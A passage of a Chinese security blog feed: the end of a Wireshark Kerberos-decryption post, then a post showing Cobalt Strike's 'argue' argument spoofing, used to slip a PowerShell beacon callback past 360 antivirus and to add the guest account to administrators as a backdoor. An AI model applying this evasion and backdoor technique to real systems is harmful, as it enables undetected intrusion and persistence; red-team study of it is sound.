<p><strong>注意：可多次导入不同的keytab，wireshark将尝试所有keytab进行解密</strong></p>
<h1 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h1><p><a href="https://wiki.wireshark.org/Kerberos?highlight=%28kerberos%29" target="_blank" rel="noopener">https://wiki.wireshark.org/Kerberos?highlight=%28kerberos%29</a><br><a href="https://www.freebuf.com/articles/system/151463.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/151463.html</a></p>
<h1 id="更新信息"><a href="#更新信息" class="headerlink" title="更新信息"></a>更新信息</h1><table>
<thead>
<tr>
<th>修订时间</th>
<th>修订人</th>
<th>简述</th>
</tr>
</thead>
<tbody><tr>
<td>2020.03.13</td>
<td>3t2ugg1e</td>
<td>创建文章</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>cobaltstrike的argue参数污染功能使用示例</title>
    <url>/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<p>by 3t2ugg1e</p>
<h1 id="argue参数污染"><a href="#argue参数污染" class="headerlink" title="argue参数污染"></a>argue参数污染</h1><p><strong>使用adminstrator或system权限</strong><br>Use:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">argue [command] [fake arguments]</span><br></pre></td></tr></table></figure>
<p><strong>注意：fake arguments应该比真实的要长</strong></p>
<h2 id="示例1：powershell一句话上线"><a href="#示例1：powershell一句话上线" class="headerlink" title="示例1：powershell一句话上线"></a>示例1：powershell一句话上线</h2><p>直接运行powershell.exe一句话上线命令，会直接被360拦截<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/E0811C7A-AEE5-4907-A270-2E607D9C5DDC.png" alt="003039c03bff343c52f3d3e462f68b27"><br>使用processmonitor检查，发现是传递的是真实参数<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/EAF02A5C-35A2-4985-8492-DE6B61C7E388.png" alt="dced7af413a6081977fb7401487eb5aa"></p>
<p>使用cobalt strike的argue参数污染：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">argue powershell.exe xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
<p>再运行argue，检查污染结果<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/85ECFD1A-C7D3-4FD5-89F8-1C8FBF6B136F.png" alt="1dca893d08fac818ca8d34f10eb91a06"><br>execute执行powershell.exe（shell命令不会成功，因为shell本质是cmd.exe /c arguments）<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/C19451C9-1990-436D-9678-81C2A24E8D72.png" alt="34211393c88e97a1cd2b4bcd876d8e99"><br>使用processmonitor检查，发现参数污染成功，且360未拦截powershell.exe<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/387C8346-FCCA-4D45-A377-95EDD0170BF3.png" alt="618af8d5f7c193ae2f5b85875f9f6c10"><br>成功上线！<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/0121B908-46DD-4A31-8617-88A87DF60804.png" alt="9e8342c1a3e8f6079168ebdfac737269"></p>
<h2 id="示例2：添加guest后门"><a href="#示例2：添加guest后门" class="headerlink" title="示例2：添加guest后门"></a>示例2：添加guest后门</h2><p>首先查看guest用户组权限为Guests<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/58A68E9A-9727-41E1-AF9D-70512DB90DCA.png" alt="d9fc9f23462b3f4013df92f7ad1b30db"><br>添加guest为administrators组，发现被360拦截<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/577127F2-83E9-458D-829E-D817C42105AA.png" alt="3bb151bac7df07e7c0ebe61eca41a5bd"><br>使用argue参数污染net1程序（注意是net1，而不是net，因为net还是会把真正的参数传递给net1的）<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/37770400-C949-4726-83BF-61821363D36A.png" alt="57fa1b66fe9ece49cc25b68aa10051f3"><br>在cobaltstrike上使用execute添加guest到administrators组<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/98567D8B-A3CE-4AB5-AC93-BC6E50C45EB8.png" alt="e971d764512097d2aa041e581dc8612d"><br>检查processmonitor发现参数污染成功，且360未拦截<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/1130331F-DA3C-48D2-9F1A-69051F969CAD.png" alt="c9cd728af74d9edd20d75397c915ce79"><br>成功添加guest到administrators组<br><img src="/2020/05/04/cobaltstrike%E7%9A%84argue%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%8A%9F%E8%83%BD%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/23FC1048-903D-4990-B364-FC2DF3F01E15.png" alt="9da534108d2f057db41fd715a28a03b9"></p>
]]></content>
  </entry>
</search>
